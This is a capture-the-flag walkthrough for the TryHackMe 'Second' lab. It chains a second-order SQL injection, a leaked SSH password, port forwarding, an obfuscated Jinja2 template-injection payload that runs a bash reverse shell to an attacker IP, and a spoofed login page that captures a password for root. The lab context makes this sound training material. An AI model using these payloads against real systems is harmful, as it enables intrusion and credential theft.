# [Second](https://tryhackme.com/room/fearsecond)

## You Shall Fear The Second Order.

# Get the user and root flag

## Being second isn't such a bad thing, but not in this case.

### What is the user flag?

1. Run nmap to identify open services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.8.10)
```

2. The registration form is vulnerable to SQL injection. Use the payload in the username field: `' union select 1,group_concat(username,password),3,4 from users -- ` to dump credentials from the users table.

3. Log in with the injected account. Click `Let's Count Them` to trigger the vulnerable query and display the dumped credentials. The result contains the `smokey` user password.

[SCREEN01]

4. SSH to smokey.

```bash
ssh smokey@<TARGET_IP>
# Password: Sm0K3s_Th3C@t
```

5. Run `ss -tulpn` to find services listening on the host.

```bash
ss -tulpn
```

**Results:**

```
Netid  State   Recv-Q  Send-Q          Local Address:Port      Peer Address:Port  Process
udp    UNCONN  0       0               127.0.0.53%lo:53             0.0.0.0:*
udp    UNCONN  0       0          <TARGET_IP>%eth0:68             0.0.0.0:*
tcp    LISTEN  0       151                 127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN  0       511                 127.0.0.1:8080           0.0.0.0:*
tcp    LISTEN  0       4096            127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN  0       128                   0.0.0.0:8000           0.0.0.0:*      users:(("python3",pid=824,fd=3))
tcp    LISTEN  0       70                  127.0.0.1:33060          0.0.0.0:*
tcp    LISTEN  0       128                   0.0.0.0:22             0.0.0.0:*
tcp    LISTEN  0       128                 127.0.0.1:5000           0.0.0.0:*
tcp    LISTEN  0       128                      [::]:22                [::]:*
```

> Notice `127.0.0.1:5000` and `127.0.0.1:8080`, meaning the app is only reachable locally.

6. Forward remote `localhost:5000` to local port `5000` so the internal app becomes accessible from your machine.

```bash
ssh -L 5000:localhost:5000 smokey@<TARGET_IP>
```

7. Browse to `http://localhost:5000/` and inspect the web app.

8. Create the payload file on the target so it can be executed from the app.

```bash
cd /dev/shm/
echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" > shell.sh
```

9. Start listener

```bash
nc -lvnp 4444
```

10. The app is vulnerable to server-side template injection. Use below payload:

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash /dev/shm/shell.sh')|attr('read')()}}
```

11. After submitting the payload, login to execute the injected command.

12. Capture user flag.

```bash
cat user.txt
```

[SCREEN02]

---

### What is the root flag?

_How can one capture the progress check? Only a shark would know._

1. Stabilize shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

2. Read note.txt

```bash
cat note.txt
```

**Results:**

```
Hello Hazel

Please finish the second project site as soon as possible. Make sure the WAF actually stops all attacks and that you are using the proper render template to avoid SSTI. You really should make your site secure like my word counter.

Also, I need you to put a pep in your step on that PHP site, I will be logging in to check your progress on it.

Sincerely,
Smokey
```

> The note confirms the internal dev site and mentions `WAF`, `SSTI`, and `dev_site.thm`.

3. Check Apache config

```bash
ls -la /etc/apache2/sites-available/
cat /etc/apache2/sites-available/dev_site.conf
```

**Results:**

```conf
Listen 127.0.0.1:8080

<VirtualHost 127.0.0.1:8080>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        ServerName dev_site.thm

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/dev_site/
        ...
</VirtualHost>

```

4. Run a local HTTP server on port `8080` to serve the fake site:

```bash
# ssh -L 8080:localhost:8080 smokey@<TARGET_IP>
python3 -m http.server 8080
```

5. Edit `hosts` so `dev_site.thm` resolves to your attacker IP

```bash
vi /etc/hosts
cat /etc/hosts
```

**Results:**

```
127.0.0.1 localhost
<ATTACKER_IP> dev_site.thm
127.0.1.1 second

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

6. Forward remote `localhost:8080` to your local machine.

```bash
ssh -L 1234:localhost:8080 smokey@<TARGET_IP>
```

7. Copy the site from `http://localhost:1234/`, and put it in the folder where pythone server is as `index.html`

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Login</title>
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
    />
    <style>
      body {
        font: 14px sans-serif;
      }
      .wrapper {
        width: 360px;
        padding: 20px;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <h2>User Login</h2>
      <p>Please fill in your credentials to login.</p>

      <form action="/index.php" method="post">
        <div class="form-group">
          <label>Username</label>
          <input type="text" name="username" class="form-control " value="" />
          <span class="invalid-feedback"></span>
        </div>
        <div class="form-group">
          <label>Password</label>
          <input type="password" name="password" class="form-control " />
          <span class="invalid-feedback"></span>
        </div>
        <div class="form-group">
          <input type="submit" class="btn btn-primary" value="Login" />
        </div>
      </form>
    </div>
  </body>
</html>
```

8. Open `Wireshark` and wait for `POST` request form the server.

[SCREEN03]

9. Escalate to root

```bash
su
cat /root/root.txt
```

[SCREEN04]

---
